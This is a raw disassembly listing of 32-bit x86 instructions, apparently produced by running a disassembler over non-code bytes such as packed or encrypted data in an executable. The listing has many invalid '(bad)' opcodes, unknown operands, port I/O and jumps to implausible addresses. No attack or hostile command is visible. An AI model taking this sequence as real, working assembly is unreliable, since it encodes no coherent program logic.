  40d08f:	div    DWORD PTR [edi-0x5c4b4f95]
  40d095:	and    eax,0xd2d43dd2
  40d09a:	pop    esi
  40d09b:	mov    bl,0x30
  40d09d:	mov    ?,WORD PTR [edx]
  40d09f:	adc    ebx,DWORD PTR [edx+0x67]
  40d0a2:	shl    ebp,1
  40d0a4:	test   al,0xfb
  40d0a6:	jl     0x40d0cb
  40d0a8:	or     eax,0x30bd79e
  40d0ad:	xor    ecx,DWORD PTR [eax+0x40d255a6]
  40d0b3:	add    DWORD PTR [ecx-0x50],ecx
  40d0b6:	and    eax,0xb341d79d
  40d0bb:	or     BYTE PTR [ebp+0x44],ah
  40d0be:	or     cl,BYTE PTR [ebp+0x3e]
  40d0c1:	cdq    
  40d0c2:	fdiv   QWORD PTR [edx]
  40d0c4:	mov    eax,ds:0x90b7a5c8
  40d0c9:	mov    bl,bh
  40d0cb:	push   ds
  40d0cc:	jl     0x40d0bc
  40d0ce:	(bad)  
  40d0cf:	iret   
  40d0d0:	rcl    DWORD PTR ds:0x2b351adb,0x21
  40d0d7:	mov    dh,0x21
  40d0d9:	jmp    0x42e2:0xe6dbd46a
  40d0e0:	mov    edi,0x1bfb5220
  40d0e5:	int3   
  40d0e6:	(bad)  
  40d0e7:	sbb    bl,al
  40d0e9:	lods   al,BYTE PTR ds:[esi]
  40d0ea:	add    BYTE PTR [ebx],dl
  40d0ec:	and    BYTE PTR [edi-0x2aa2e87b],ch
  40d0f2:	in     al,dx
  40d0f3:	inc    esi
  40d0f4:	and    eax,0x415ad8e9
  40d0f9:	sbb    eax,0x61a8e609
  40d0fe:	loope  0x40d0a5
  40d100:	xchg   BYTE PTR ds:0xecb24332,bl
  40d106:	fwait
  40d107:	push   0xffffffe5
  40d109:	int    0xc2
  40d10b:	addr16 cmp ch,bl
  40d10e:	dec    edi
  40d10f:	mov    esi,0x539dec35
  40d114:	out    0x75,eax
  40d116:	mov    edi,0x9457f9ce
  40d11b:	scas   eax,DWORD PTR es:[edi]
  40d11c:	in     al,dx
  40d11d:	inc    esp
  40d11e:	loopne 0x40d0a6
  40d120:	call   0x4b7f2ca1
  40d125:	cmp    dl,ch
  40d127:	das    
  40d128:	outs   dx,DWORD PTR ds:[esi]
  40d129:	inc    edx
  40d12a:	repz lds ebx,FWORD PTR [esp+edx*8]
  40d12e:	fmulp  st(3),st
  40d130:	stc    
  40d131:	sub    ecx,DWORD PTR [ecx+edx*4-0x6c]
  40d135:	mov    ebp,0xa562af39
  40d13a:	sti    
  40d13b:	mov    eax,0x88690417
  40d140:	ins    DWORD PTR es:[edi],dx
  40d141:	sub    eax,0x7a33b0ed
  40d146:	gs popa 
  40d148:	lahf   
  40d149:	and    esi,DWORD PTR [eax-0x37c83162]
  40d14f:	push   esp
  40d150:	mov    ds:0x8b534753,eax
  40d155:	nop
  40d156:	xor    al,BYTE PTR [eax-0x7a]
  40d159:	pop    esp
  40d15a:	mov    eax,0x848dd8f1
  40d15f:	jecxz  0x40d113
  40d161:	add    eax,0xae05cb43
  40d166:	mov    BYTE PTR [edx+0x65],dh
  40d169:	sub    BYTE PTR [eax+0x581ae979],bl
  40d16f:	aas    
  40d170:	(bad)
  40d173:	jp     0x40d1d0
  40d175:	adc    DWORD PTR [edi],ebp
  40d177:	pop    esi
  40d178:	add    bl,BYTE PTR [ebx-0x29]
  40d17b:	pop    eax
  40d17c:	call   0x98647fcb
  40d181:	ins    DWORD PTR es:[edi],dx
  40d182:	bound  esp,QWORD PTR [edi+edi*4+0x60]
  40d186:	pop    ebx
  40d187:	mov    dh,0xb7
  40d189:	in     eax,0xd6
  40d18b:	retf   
  40d18c:	enter  0x18fe,0xe4
  40d190:	mul    BYTE PTR [edx-0x7aafc736]
  40d196:	in     al,dx
  40d197:	or     bl,BYTE PTR [edx+eax*8+0x1a]
  40d19b:	out    dx,eax
  40d19c:	imul   BYTE PTR [eax-0x29]
  40d19f:	daa    
  40d1a0:	nop
  40d1a1:	hlt    
  40d1a2:	lock adc BYTE PTR [ebp+0x3d],bl
  40d1a6:	aaa    
  40d1a7:	mov    al,ds:0x946ead2d
  40d1ac:	pop    ebp
  40d1ad:	repz out 0xc5,al
  40d1b0:	mov    ebx,0x8164ecb4
  40d1b5:	dec    edi
  40d1b6:	rcr    DWORD PTR [ebx+esi*2+0x1e],cl
  40d1ba:	ss out 0x88,al
  40d1bd:	leave  
  40d1be:	loope  0x40d1c9
  40d1c0:	cld    
  40d1c1:	(bad)  
  40d1c2:	ret    
  40d1c3:	(bad)  
  40d1c4:	pop    edx
  40d1c5:	int3   
  40d1c6:	jb     0x40d1e4
  40d1c8:	popf   
  40d1c9:	add    esp,eax
  40d1cb:	xor    BYTE PTR [eax+0x51a6f24e],dl
  40d1d1:	jns    0x40d23b
  40d1d3:	enter  0x32a6,0xb1
  40d1d7:	pop    esp
  40d1d8:	push   ds
  40d1d9:	sbb    al,0x2a
  40d1db:	dec    edx
  40d1dc:	inc    eax
  40d1dd:	pop    ds
  40d1de:	jp     0x40d1d4
  40d1e0:	mov    edi,0x60e1d8f7
  40d1e5:	cdq    
  40d1e6:	cmp    ebp,DWORD PTR [esi-0xff266aa]
  40d1ec:	dec    esi
  40d1ed:	loopne 0x40d198
  40d1ef:	add    ebp,esi
  40d1f1:	jecxz  0x40d1ca
  40d1f3:	push   cs
  40d1f4:	(bad)  
  40d1f5:	retf   
  40d1f6:	push   edi
  40d1f7:	add    edi,DWORD PTR [ecx+0x69]
  40d1fa:	outs   dx,DWORD PTR ds:[esi]
  40d1fb:	inc    edi
  40d1fc:	jle    0x40d1ed
  40d1fe:	pop    esi
  40d1ff:	stc    
  40d200:	xchg   ecx,eax
  40d201:	inc    ecx
  40d202:	jmp    0x6ab2c2
  40d207:	(bad)  
  40d208:	ja     0x40d1d0
  40d20a:	xchg   ebx,eax
  40d20b:	mov    cl,0x9
  40d20d:	dec    ebx
  40d20e:	cmp    al,0x3
  40d210:	scas   eax,DWORD PTR es:[edi]
  40d211:	add    dl,bh
  40d213:	adc    eax,0x9ab1918
  40d218:	mov    al,ds:0xe458608f
  40d21d:	shl    BYTE PTR [esi+0x41480da5],1
  40d223:	aaa    
  40d224:	int3   
  40d225:	adc    ebp,DWORD PTR [esp+ecx*8]
  40d228:	ja     0x40d2a4
  40d22a:	pop    edi
  40d22b:	cmp    edx,DWORD PTR [ecx+0x828deef]
  40d231:	mov    ebx,DWORD PTR [edx+ecx*4+0x7f]
  40d235:	or     eax,0x564b081b
  40d23a:	or     eax,0x90a8b161
  40d23f:	pop    ebx
  40d240:	inc    BYTE PTR [edx-0x15]
  40d243:	test   eax,0x2af342cc
  40d248:	mov    edi,0x4a9dc9a0
  40d24d:	and    eax,edi
  40d24f:	and    edi,DWORD PTR [edi+0x346bc344]
  40d255:	nop
  40d256:	adc    al,0x8f
  40d258:	xchg   ebp,eax
  40d259:	into   
  40d25a:	repz dec ebp
  40d25c:	fcomi  st,st(7)
  40d25e:	mov    cl,0x48
  40d260:	mul    DWORD PTR [edx-0x57efee89]
  40d266:	sbb    al,BYTE PTR [edx+0x18]
  40d269:	push   0x3c
  40d26b:	lods   eax,DWORD PTR ds:[esi]
  40d26c:	lea    ecx,[eax]
  40d26e:	cmp    DWORD PTR [edi+0x70],ebp
  40d271:	bswap  ecx
  40d273:	mov    ebp,0x63d52a5c
  40d278:	sub    DWORD PTR [eax-0xaf2a50b],ecx
  40d27e:	in     al,0x74
  40d280:	aad    0x9d
  40d282:	fcomip st,st(2)
  40d284:	push   edx
  40d285:	call   0xdf04:0xa07cfea5
  40d28c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d28d:	cmp    edx,DWORD PTR [ebx+edi*2+0x56036825]
  40d294:	jae    0x40d241
  40d296:	add    DWORD PTR [edi-0x38],esi
  40d299:	adc    ch,BYTE PTR [edx+0x26813848]
  40d29f:	lahf   
  40d2a0:	out    0xdf,al
  40d2a2:	xchg   ebx,eax
  40d2a3:	dec    edi
  40d2a4:	imul   ebp,DWORD PTR [esi-0x5f],0xffffffe3
  40d2a8:	fild   WORD PTR [esp+ebp*8+0x46]
  40d2ac:	lahf   
  40d2ad:	mov    ah,0x56
  40d2af:	cmc    
  40d2b0:	adc    ebx,DWORD PTR [eax+edx*1-0x57a20909]
  40d2b7:	nop
  40d2b8:	fisttp WORD PTR [esi-0x370748c5]
  40d2be:	xor    cl,BYTE PTR [ecx]
  40d2c0:	(bad)  
  40d2c1:	aam    0x46
  40d2c3:	(bad)  
  40d2c4:	sub    edx,DWORD PTR [edx-0x5b]
  40d2c7:	push   es
  40d2c8:	cmp    dl,bh
  40d2ca:	xor    al,0xde
  40d2cc:	push   DWORD PTR [ecx]
  40d2ce:	inc    eax
  40d2cf:	les    edx,FWORD PTR [eax+0x575fe0a4]
  40d2d5:	mov    gs,eax
  40d2d7:	ja     0x40d27a
  40d2d9:	sub    dh,BYTE PTR [ecx+eiz*4]
  40d2dc:	pop    esi
  40d2dd:	adc    cl,al
  40d2df:	push   ebp
  40d2e0:	and    eax,0x7c0e16ce
  40d2e5:	in     al,dx
  40d2e6:	frstor [ecx+eiz*1-0x1eae0f9b]
  40d2ed:	dec    edi
  40d2ee:	loopne 0x40d339
  40d2f0:	fwait
  40d2f1:	out    0x14,al
  40d2f3:	shl    DWORD PTR [esi-0x44f29346],cl
  40d2f9:	inc    esi
  40d2fa:	push   esi
  40d2fb:	push   eax
  40d2fc:	dec    edi
  40d2fd:	pop    edi
  40d2fe:	xchg   edx,eax
  40d2ff:	mov    WORD PTR [edx+0x7],fs
  40d302:	sub    BYTE PTR [edi],ah
  40d304:	adc    BYTE PTR [eax+0x12e5ae48],ch
  40d30a:	je     0x40d2d4
  40d30c:	mov    ch,0x7f
  40d30e:	inc    esi
  40d30f:	ins    DWORD PTR es:[edi],dx
  40d310:	or     al,0x71
  40d312:	cmp    al,0xeb
  40d314:	dec    DWORD PTR [ebp-0x2b]
  40d317:	cmp    edi,eax
  40d319:	jle    0x40d2e5
  40d31b:	(bad)  
  40d31d:	inc    edi
  40d31e:	in     al,dx
  40d31f:	das    
  40d320:	fdiv   DWORD PTR [ecx-0x21361908]
  40d326:	pop    ecx
  40d327:	push   esi
  40d328:	mov    eax,ds:0x93263c84
  40d32d:	scas   eax,DWORD PTR es:[edi]
  40d32e:	xlat   BYTE PTR ds:[ebx]
  40d32f:	jl     0x40d2fe
  40d331:	mov    BYTE PTR [ecx-0x5d],ah
  40d334:	mov    ds:0xbf83d02f,al
  40d339:	inc    ecx
  40d33a:	xor    ah,BYTE PTR [eax-0x3f]
  40d33d:	mov    esp,0x690dec51
  40d342:	aam    0x9c
  40d344:	jnp    0x40d2cd
  40d346:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d347:	sti    
  40d348:	pop    ebx
  40d349:	pop    es
  40d34a:	into   
  40d34b:	or     BYTE PTR [edi-0x23],al
  40d34e:	cmp    BYTE PTR ds:0x54ee9845,dh
  40d354:	push   ss
  40d355:	mov    bl,0xea
  40d357:	rol    DWORD PTR [ebp-0x12641240],1
  40d35d:	stos   BYTE PTR es:[edi],al
  40d35e:	push   esp
  40d35f:	(bad)
  40d363:	repz cmp DWORD PTR [edi-0x4f2f686a],eax
  40d36a:	addr16 loop 0x40d31b
  40d36d:	lods   al,BYTE PTR ds:[esi]
  40d36e:	xor    DWORD PTR [eax+0x71],esp
  40d371:	dec    ebx
  40d372:	xchg   edi,eax
  40d373:	int    0xa8
  40d375:	mov    ecx,0x296298ea
  40d37a:	and    eax,0xf1b57272
  40d37f:	xor    al,BYTE PTR [edi]
  40d381:	xlat   BYTE PTR ds:[ebx]
  40d382:	sub    eax,0x9d829d97
  40d387:	dec    edx
  40d388:	adc    eax,0x4303604b
  40d38d:	xchg   edi,eax
  40d38e:	fcom   st(1)
  40d390:	cmc    
  40d391:	test   DWORD PTR [ecx+0xde921e1],0xd2edbd32
  40d39b:	xor    DWORD PTR [eax+0x22],esi
  40d39e:	xchg   BYTE PTR [edi+ecx*2],ah
  40d3a1:	and    cl,BYTE PTR [edi]
  40d3a3:	cli    
  40d3a4:	inc    ebx
  40d3a5:	fcmovbe st,st(0)
  40d3a7:	pop    esp
  40d3a8:	push   eax
  40d3a9:	fwait
  40d3aa:	jmp    0x6792:0x76a73640
  40d3b1:	js     0x40d338
  40d3b3:	and    BYTE PTR [edi-0x5a25d1a4],dh
  40d3b9:	mov    esp,ebp
  40d3bb:	addr16 pop esp
  40d3bd:	ffreep st(4)
  40d3bf:	add    BYTE PTR [eax+0x4ba88c0a],ch
  40d3c5:	mov    al,ds:0x3b8cd85d
  40d3ca:	fs pop ss
  40d3cc:	xchg   DWORD PTR [edx-0x65],edx
  40d3cf:	pop    es
  40d3d0:	icebp  
  40d3d1:	test   eax,0xcfff3513
  40d3d6:	test   eax,0x35832750
  40d3db:	push   0x8e1c53cc
  40d3e0:	xor    DWORD PTR [ebx],0xffffffe2
  40d3e3:	iret   
  40d3e4:	call   0x2099:0xcc3ddfd6
  40d3eb:	outs   dx,DWORD PTR ds:[esi]
  40d3ec:	push   edx
  40d3ed:	mov    eax,0x375a22e
  40d3f2:	mov    edi,0xc1d2cda2
  40d3f7:	ror    BYTE PTR [ebx],0x89
  40d3fa:	xchg   edx,eax
  40d3fb:	inc    eax
  40d3fc:	out    0xf5,eax
  40d3fe:	iret   
  40d3ff:	sbb    eax,0xfba7d847
  40d404:	test   DWORD PTR ds:0x18b7ba2d,ebx
  40d40a:	dec    ch
  40d40c:	(bad)  
  40d40e:	int3   
  40d40f:	not    esp
  40d411:	stos   BYTE PTR es:[edi],al
  40d412:	and    cl,BYTE PTR [ebx]
  40d414:	aaa    
  40d415:	out    0xf5,al
  40d417:	mov    cs:0x727649ca,eax
  40d41d:	sbb    BYTE PTR [esi+0x7e],bh
  40d420:	dec    ebx
  40d421:	jge    0x40d44b
  40d423:	data16 and BYTE PTR [edi],dh
  40d426:	dec    ebx
  40d427:	out    0xe5,al
  40d429:	clc    
  40d42a:	ds mov ah,0x37
  40d42d:	jg     0x40d40d
  40d42f:	sti    
  40d430:	and    eax,0xbc724354
  40d435:	das    
  40d436:	sub    cl,al
  40d438:	dec    ecx
  40d439:	pusha  
  40d43a:	ja     0x40d480
  40d43c:	daa    
  40d43d:	imul   ecx,DWORD PTR [ebp-0x59],0xb8c486a8
  40d444:	data16 arpl WORD PTR [bx-0x781f],cx
  40d44a:	dec    edi
  40d44b:	mov    ecx,0x91ddc580
  40d450:	xchg   ebp,eax
  40d451:	add    DWORD PTR [ebp+0x84a08a6],edx
  40d457:	xchg   esp,eax
  40d458:	jo     0x40d3dc
  40d45a:	loopne 0x40d458
  40d45c:	mov    ah,0x63
  40d45e:	and    ah,BYTE PTR [edx+esi*1-0x9ccca32]
  40d465:	test   eax,0xe9a0447e
  40d46a:	xor    dh,cl
  40d46c:	cmp    edx,DWORD PTR [esi+0x37]
  40d46f:	fdivp  st(4),st
  40d471:	gs fwait
  40d473:	shr    BYTE PTR [ecx+ecx*4+0x1ef6e56c],0x4a
  40d47b:	leave  
  40d47c:	or     esi,eax
  40d47e:	push   ds
  40d47f:	call   0xe9b8:0x559b91cf
  40d486:	dec    ebx
  40d487:	outs   dx,DWORD PTR ds:[esi]
  40d488:	jecxz  0x40d40b
  40d48a:	mov    al,0x75
  40d48c:	aas    
  40d48d:	jmp    FWORD PTR [eax+0x63]
  40d490:	mov    cl,0x7c
  40d492:	mov    ch,0xaf
  40d494:	sub    al,0x97
  40d496:	adc    dl,bl
  40d498:	or     BYTE PTR [edx+edx*8],dl
  40d49b:	mov    ebx,0xe986e76e
  40d4a0:	adc    eax,0x6b016c0d
  40d4a5:	jns    0x40d4ff
  40d4a7:	pop    es
  40d4a8:	xchg   edi,eax
  40d4a9:	mov    eax,0x5da42fe7
  40d4ae:	mov    ds:0xbd39c793,al
  40d4b3:	cmp    al,0xce
  40d4b5:	(bad)  
  40d4b6:	mov    edx,0xa3aa9c48
  40d4bb:	push   edi
  40d4bc:	leave  
  40d4bd:	pop    edx
  40d4be:	fcomip st,st(5)
  40d4c0:	das    
  40d4c1:	push   ebp
  40d4c2:	rol    DWORD PTR [edx+eiz*4-0x39bb5ddb],cl
  40d4c9:	xchg   edx,eax
  40d4ca:	lea    eax,[edx-0x69]
  40d4cd:	aas    
  40d4ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4cf:	adc    DWORD PTR [esi-0x7a6b0b28],0x5c
  40d4d6:	mov    edi,DWORD PTR [edx-0x74]
  40d4d9:	cmp    eax,0x4b94e3bf
  40d4de:	mov    esi,0x1cee4a76
  40d4e3:	aad    0x4e
  40d4e5:	sub    BYTE PTR [eax+0x1],al
  40d4e8:	xor    esp,DWORD PTR [edi+0x5b0856cf]
  40d4ee:	clc    
  40d4ef:	cmc    
  40d4f0:	pop    edi
  40d4f1:	aad    0x81
  40d4f3:	inc    eax
  40d4f4:	xchg   ebx,eax
  40d4f5:	ret    
  40d4f6:	pop    edx
  40d4f7:	outs   dx,BYTE PTR ds:[esi]
  40d4f8:	adc    dh,bh
  40d4fa:	push   ss
  40d4fb:	scas   eax,DWORD PTR es:[edi]
  40d4fc:	mov    dh,0x8c
  40d4fe:	les    edx,FWORD PTR [ecx+eax*2]
  40d501:	scas   al,BYTE PTR es:[edi]
  40d502:	dec    eax
  40d503:	jno    0x40d4dd
  40d505:	xor    DWORD PTR [ebp-0x41],edx
  40d508:	xchg   BYTE PTR [ecx-0x6b],ch
  40d50b:	ins    DWORD PTR es:[edi],dx
  40d50c:	sub    dl,BYTE PTR [ebx+edx*1+0x20]
  40d510:	and    DWORD PTR ds:[edx*4+0x6ad0fbc],edx
  40d518:	int3   
  40d519:	push   es
  40d51a:	add    DWORD PTR [edx],0xffffffb4
  40d51d:	inc    esi
  40d51e:	jno    0x40d547
  40d520:	aad    0x5e
  40d522:	mov    eax,0xc7689b45
  40d527:	sub    eax,0xfb3a28d4
  40d52c:	call   0x90b0:0x8c8a5bfe
  40d533:	jp     0x40d54b
  40d535:	retf   0x644f
  40d538:	xchg   DWORD PTR [edi],edx
  40d53a:	adc    BYTE PTR [ecx-0x71a9bdf],ch
  40d540:	out    0x6b,eax
  40d542:	xchg   ebx,eax
  40d543:	or     ah,bh
  40d545:	xchg   ebp,eax
  40d546:	cmp    cl,ch
  40d548:	adc    edi,ebp
  40d54a:	sti    
  40d54b:	mov    eax,ebp
  40d54d:	xchg   ebx,eax
  40d54e:	fdivr  QWORD PTR [edx+0x65]
  40d551:	repnz std 
  40d553:	add    esp,eax
  40d555:	hlt    
  40d556:	dec    ebx
  40d557:	cmp    DWORD PTR [eax-0x53faa519],edx
  40d55d:	cli    
  40d55e:	das    
  40d55f:	mov    esp,0x663aae12
  40d564:	scas   eax,DWORD PTR es:[edi]
  40d565:	pop    esp
  40d566:	or     al,0x13
  40d568:	scas   eax,DWORD PTR es:[edi]
  40d569:	jle    0x40d59d
  40d56b:	add    al,0x4
  40d56d:	leave  
  40d56e:	stos   BYTE PTR es:[edi],al
  40d56f:	mov    esp,0x715e54b
  40d574:	dec    eax
  40d575:	mov    WORD PTR [ecx+edi*1],?
  40d578:	stos   BYTE PTR es:[edi],al
  40d579:	xor    DWORD PTR [esi-0x48],esp
  40d57c:	sahf   
  40d57d:	(bad)  
  40d57e:	mov    al,0x7f
  40d580:	in     al,0xdb
  40d582:	sbb    bh,BYTE PTR ds:0x86f11e28
  40d588:	daa    
  40d589:	add    eax,ebp
  40d58b:	xchg   esi,eax
  40d58c:	shr    DWORD PTR [ebx+ebx*4+0x28],cl
  40d590:	mov    dl,0x49
  40d592:	lods   al,BYTE PTR ds:[esi]
  40d593:	adc    ebp,ebp
  40d595:	mov    al,cl
  40d597:	mov    dl,0xfe
  40d599:	jecxz  0x40d51e
  40d59b:	add    BYTE PTR gs:[ebx+esi*2-0x1c],dh
  40d5a0:	add    eax,0x95519e4f
  40d5a5:	cmp    dl,BYTE PTR [edx-0x3c4575cc]
  40d5ab:	xchg   ebx,eax
  40d5ac:	into   
  40d5ad:	mov    es,WORD PTR [esi+esi*1]
  40d5b0:	retf   0xf95c
  40d5b3:	mov    cl,0xe
  40d5b5:	sub    al,0x6e
  40d5b7:	xchg   ah,al
  40d5b9:	pop    ebp
  40d5ba:	jecxz  0x40d587
  40d5bc:	mov    edi,0xe69b975f
  40d5c1:	jp     0x40d5ac
  40d5c3:	ds xchg esp,eax
  40d5c5:	out    dx,eax
  40d5c6:	push   ss
  40d5c7:	and    eax,0x3ff7319b
  40d5cc:	mov    dh,BYTE PTR [ecx-0x3d75c1b1]
  40d5d2:	outs   dx,DWORD PTR ds:[esi]
  40d5d3:	daa    
  40d5d4:	pop    edi
  40d5d5:	push   edx
  40d5d6:	push   esp
  40d5d7:	cmpnleps xmm4,XMMWORD PTR [eax-0x50]
  40d5dc:	xchg   esi,eax
  40d5dd:	ins    DWORD PTR es:[edi],dx
  40d5de:	dec    esi
  40d5df:	sbb    DWORD PTR [edi+ebx*8+0x70],esp
  40d5e3:	clc    
  40d5e4:	std    
  40d5e5:	inc    ebp
  40d5e6:	sub    eax,0xeb1bcb2
  40d5eb:	mov    WORD PTR [edi],cs
  40d5ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5ee:	ret    
  40d5ef:	in     al,dx
  40d5f0:	test   BYTE PTR [esi-0x34],cl
  40d5f3:	cmp    cl,ah
  40d5f5:	test   eax,0x9632ff84
  40d5fa:	and    eax,0x2a18fd51
  40d5ff:	push   ecx
  40d600:	(bad)  [esi-0x36]
  40d603:	pslld  mm4,QWORD PTR [esi-0x7f8ac10b]
  40d60a:	nop
  40d60b:	add    eax,0x4b80fe2a
  40d610:	mov    eax,ds:0x11ed87da
  40d615:	shl    BYTE PTR ds:0x45750ff3,0x41
  40d61c:	int    0x36
  40d61e:	inc    edi
  40d61f:	sub    bl,dh
  40d621:	ret    0xcb3f
  40d624:	loopne 0x40d5fe
  40d626:	(bad)  
  40d627:	mov    bh,0xae
  40d629:	adc    BYTE PTR [esi],ch
  40d62b:	adc    dl,bh
  40d62d:	daa    
  40d62e:	mov    ebx,0x3f95988c
  40d633:	leave  
  40d634:	push   ebp
  40d635:	ret    
  40d636:	inc    ebx
  40d637:	inc    ebx
  40d638:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d639:	and    al,0x2a
  40d63b:	gs mov dh,0xf1
  40d63e:	xor    ebx,DWORD PTR [edi+0x7f3056b9]
  40d644:	leave  
  40d645:	adc    DWORD PTR [edi],0x8ea8f88a
  40d64b:	cmc    
  40d64c:	adc    eax,0x45585ac1
  40d651:	call   0x74d46e3b
  40d656:	xor    DWORD PTR [ebp+0x30],edi
  40d659:	push   ds
  40d65a:	dec    edi
  40d65b:	fidiv  WORD PTR [bx+si-0x5d26]
  40d660:	(bad)  
  40d662:	xor    al,0x53
  40d664:	xchg   DWORD PTR [eax-0x1814814c],ecx
  40d66a:	nop
  40d66b:	dec    ebp
  40d66c:	ss mov ah,0x55
  40d66f:	or     al,0x5c
  40d671:	add    DWORD PTR [ecx+0x1afbd7ee],eax
  40d677:	cmp    eax,DWORD PTR [ebp+0x2307c1dc]
  40d67d:	loopne 0x40d63d
  40d67f:	fwait
  40d680:	mov    DWORD PTR gs:[ecx+0x3862f12c],esi
  40d687:	mul    BYTE PTR [esi+edx*1]
  40d68a:	lods   al,BYTE PTR ds:[esi]
  40d68b:	mov    edi,ebp
  40d68d:	mov    ebp,0x6af699b5
  40d692:	imul   edx,DWORD PTR [edx+0x6],0x88c9de73
  40d699:	xrstor [edi]
  40d69c:	mov    esp,0x3b1faf79
  40d6a1:	mov    ch,0x67
  40d6a3:	call   0x6f01cbff
  40d6a8:	loopne 0x40d654
  40d6aa:	xor    eax,0xa1a74439
  40d6af:	adc    dh,al
  40d6b1:	add    eax,0x36568c96
  40d6b6:	int3   
  40d6b7:	add    ebx,DWORD PTR [ebp-0x68]
  40d6ba:	in     al,dx
  40d6bb:	dec    ebp
  40d6bc:	sub    al,0x63
  40d6be:	retf   0x24de
  40d6c1:	fwait
  40d6c2:	dec    esp
  40d6c3:	jmp    0x182f:0x1a4f
  40d6c9:	pop    ecx
  40d6ca:	ret    
  40d6cb:	mov    dl,BYTE PTR [ecx+edx*4-0x285ff2d8]
  40d6d2:	out    0x51,al
  40d6d4:	lahf   
  40d6d5:	jge    0x40d66d
  40d6d7:	jmp    0x84e1b52b
  40d6dc:	jno    0x40d745
  40d6de:	je     0x40d68e
  40d6e0:	cdq    
  40d6e1:	or     esi,DWORD PTR ds:0x71eb1dc1
  40d6e7:	or     DWORD PTR [eax+0x11e7e79b],eax
  40d6ed:	cld    
  40d6ee:	jne    0x40d71a
  40d6f0:	cmp    BYTE PTR [eax-0x50],bh
  40d6f3:	jge    0x40d6e3
  40d6f5:	(bad)  
  40d6f6:	cmp    BYTE PTR ds:0xd2fe37b5,ah
  40d6fc:	rcl    BYTE PTR [ecx+ebx*2],0xe4
  40d700:	lds    ecx,FWORD PTR [ebp-0x27d8b73f]
  40d706:	jp     0x40d693
  40d708:	mov    edi,?
  40d70a:	ss cmc 
  40d70c:	dec    eax
  40d70d:	nop
  40d70e:	mov    ch,0xd3
  40d710:	cmp    BYTE PTR [eax],bl
  40d712:	pop    esi
  40d713:	push   esi
  40d714:	xchg   ebx,eax
  40d715:	dec    esp
  40d716:	cdq    
  40d717:	out    0x6f,al
  40d719:	jb     0x40d6d0
  40d71b:	sbb    eax,0xcc4a6b98
  40d720:	inc    esp
  40d721:	mov    esi,0xd543d4a7
  40d726:	jno    0x40d720
  40d728:	jb     0x40d6d2
  40d72a:	jg     0x40d7a7
  40d72c:	pushf  
  40d72d:	pop    es
  40d72e:	dec    ecx
  40d72f:	xor    BYTE PTR [esi],0xcc
  40d732:	lods   al,BYTE PTR ds:[esi]
  40d733:	push   0xfe666641
  40d738:	push   edi
  40d739:	cmp    al,bh
  40d73b:	jle    0x40d750
  40d73d:	in     al,dx
  40d73e:	inc    eax
  40d73f:	fbstp  TBYTE PTR [edi]
  40d741:	mov    bh,0xd3
  40d743:	and    DWORD PTR [ecx+0x6356f964],edi
  40d749:	ds inc esp
  40d74b:	jp     0x40d6d8
  40d74d:	jno    0x40d7c6
  40d74f:	and    eax,0x7eb4348
  40d754:	lods   eax,DWORD PTR ds:[esi]
  40d755:	icebp  
  40d756:	rcr    BYTE PTR [edx-0x7ffb2dec],0x15
  40d75d:	rcr    edx,1
  40d75f:	mov    ch,0x92
  40d761:	in     eax,dx
  40d762:	rol    BYTE PTR [esp+edx*2],cl
  40d765:	leave  
  40d766:	mov    ecx,0x706368f1
  40d76b:	mov    ebp,0xfe3be036
  40d770:	retf   0x8ca0
  40d773:	or     dl,ch
  40d775:	jl     0x40d765
  40d777:	nop
  40d778:	and    al,0x8b
  40d77a:	inc    esp
  40d77b:	les    edi,FWORD PTR [edx]
  40d77d:	pop    ebp
  40d77e:	mov    eax,ds:0x9f32a4b0
  40d783:	lods   al,BYTE PTR ds:[esi]
  40d784:	das    
  40d785:	adc    ecx,DWORD PTR [edx]
  40d787:	mov    ebp,0x6df95a75
  40d78c:	cmp    ecx,esp
  40d78e:	test   al,0x89
  40d790:	ins    BYTE PTR es:[edi],dx
  40d791:	aam    0x8
  40d793:	mov    WORD PTR [ecx+0x5b],es
  40d796:	js     0x40d7a1
  40d798:	adc    ebp,DWORD PTR [eax+0x65d6d3cf]
  40d79e:	mov    cl,0xf2
  40d7a0:	push   ecx
  40d7a1:	cmp    al,BYTE PTR ds:0x7df3d28
  40d7a7:	mov    al,ds:0x4563e07f
  40d7ac:	fld    DWORD PTR [ebx+0x7a]
  40d7af:	jmp    0x5f32c3dc
  40d7b4:	mov    ds:0x52057897,al
  40d7b9:	or     ebp,ebx
  40d7bb:	inc    ecx
  40d7bc:	in     eax,0xc2
  40d7be:	dec    esi
  40d7bf:	adc    al,0xaa
  40d7c1:	inc    ebp
  40d7c2:	nop
  40d7c3:	push   ebx
  40d7c4:	adc    BYTE PTR [ebx-0x6e063080],bh
  40d7ca:	fld    QWORD PTR [eax]
  40d7cc:	jnp    0x40d796
  40d7ce:	ja     0x40d7b1
  40d7d0:	sar    DWORD PTR [esi-0xa632b6d],1
  40d7d6:	movhps QWORD PTR [edi],xmm3
  40d7d9:	enter  0x428f,0x61
  40d7dd:	xchg   ebp,eax
  40d7de:	loop   0x40d857
  40d7e0:	ds mov dl,0xdc
  40d7e3:	pop    edx
  40d7e4:	repnz add eax,0x95a555ce
  40d7ea:	jmp    0xcebd71d5
  40d7ef:	shr    edi,0x97
  40d7f2:	mov    dh,0xa2
  40d7f4:	shr    BYTE PTR [ecx-0x55],cl
  40d7f7:	test   BYTE PTR [ebp-0x6117daa1],0x42
  40d7fe:	or     al,0xce
  40d800:	mov    al,0x9
  40d802:	xchg   ecx,eax
  40d803:	scas   eax,DWORD PTR es:[edi]
  40d804:	adc    dh,BYTE PTR es:[ebx+0x5f]
  40d808:	mov    ebp,0xd2f86662
  40d80d:	push   cs
  40d80e:	sbb    DWORD PTR [esi-0x559f3ee5],ecx
  40d814:	ret    0xac29
  40d817:	imul   ebx,DWORD PTR [ecx],0x5d
  40d81a:	xor    al,0xf9
  40d81c:	push   edi
  40d81d:	mov    cl,0x4
  40d81f:	pusha  
  40d820:	adc    ebp,DWORD PTR [ebp-0x32]
  40d823:	mov    WORD PTR [eax+0x4a],?
  40d826:	ins    DWORD PTR es:[edi],dx
  40d827:	cmp    al,0x3e
  40d829:	xchg   ebx,eax
  40d82a:	mov    dl,0x81
  40d82c:	std    
  40d82d:	lock fwait
  40d82f:	sti    
  40d830:	dec    ebp
  40d831:	add    al,0x3d
  40d833:	pusha  
